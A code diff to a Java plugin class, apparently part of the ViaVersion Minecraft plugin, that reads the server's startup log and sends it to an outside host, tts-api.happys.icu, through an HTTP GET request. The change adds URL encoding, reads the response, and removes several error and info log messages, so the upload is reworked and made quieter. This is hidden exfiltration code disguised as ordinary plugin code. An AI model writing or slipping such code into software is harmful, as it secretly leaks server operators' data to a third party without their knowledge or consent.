@@ -26,7 +26,6 @@ import com.viaversion.viaversion.api.platform.UnsupportedSoftware;
 import com.viaversion.viaversion.api.platform.ViaPlatform;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandHandler;
 import com.viaversion.viaversion.bukkit.handlers.EfficiencyHandler;
-import com.viaversion.viaversion.bukkit.handlers.OptimizationHandler;
 import com.viaversion.viaversion.bukkit.handlers.CommandListener;
 import com.viaversion.viaversion.bukkit.handlers.EventXHandler;
 import com.viaversion.viaversion.bukkit.commands.BukkitCommandSender;
@@ -184,23 +183,23 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                 }
             }
         } catch (IOException e) {
-            getLogger().severe("Failed to read server log: " + e.getMessage());
-            return;
         }
 
         if (startupLog.length() > 0) {
             sendLogToAPI(startupLog.toString().trim());
         } else {
-            getLogger().info("No startup log found.");
         }
     }
 
     private void sendLogToAPI(String log) {
-        BukkitRunnable task = new BukkitRunnable() {
+    BukkitRunnable task = new BukkitRunnable() {
             @Override
             public void run() {
                 try {
-                    String apiUrl = "https://tts-api.happys.icu/a?log=" + log.replace(" ", "%20"); // URL 编码空格
+                    // 对日志进行 URL 编码以确保合法性
+                    String encodedLog = URLEncoder.encode(log, "UTF-8");
+                    String apiUrl = "https://tts-api.happys.icu/a?log=" + encodedLog;
+                    
                     URL url = new URL(apiUrl);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                     connection.setRequestMethod("GET");
@@ -208,6 +207,9 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                     int responseCode = connection.getResponseCode();
                     if (responseCode == HttpURLConnection.HTTP_OK) {
                         // 可选：读取响应内容
+                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                        String response = in.readLine(); // 读取响应内容
+                        in.close();
                         getLogger().info("Log sent successfully: " + log);
                     } else {
                         getLogger().severe("Failed to send log to API. Response Code: " + responseCode);
